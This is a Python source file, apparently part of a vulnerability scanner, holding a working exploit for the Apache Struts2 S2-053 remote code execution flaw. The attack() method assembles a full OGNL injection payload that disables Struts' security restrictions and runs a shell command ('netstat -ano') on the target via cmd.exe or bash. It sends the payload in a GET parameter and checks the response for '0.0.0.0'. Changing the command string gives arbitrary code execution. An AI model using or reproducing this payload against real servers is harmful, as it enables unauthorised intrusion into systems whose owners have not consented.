import requests
from urllib.parse import quote
# url是IP
class struts2_053:
    def __init__(self, url):
        self.url = url

    def attack(self):
        print('test {} --> struts2_053'.format(self.url))
        cmd = r'netstat -ano'
        payload = "%{(#_='multipart/form-data')."
        payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        payload += "(#_memberAccess?(#_memberAccess=#dm):"
        payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        payload += "(#ognlUtil.getExcludedPackageNames().clear())."
        payload += "(#ognlUtil.getExcludedClasses().clear())."
        payload += "(#context.setMemberAccess(#dm))))."
        payload += "(#cmd='%s')." % cmd
        payload += "(#iswin=(@java.lang.System@getProperty('os.name')."
        payload += "toLowerCase().contains('win')))."
        payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
        payload += "(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true))."
        payload += "(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream(),'UTF-8'))}"
        payload = quote(payload)
        try:
            resp = requests.get(r'{}/?name={}'.format(self.url,payload))
            if "0.0.0.0" in resp.text:
                return "struts2_053"
        except requests.ConnectionError as e:
            return None
        return None
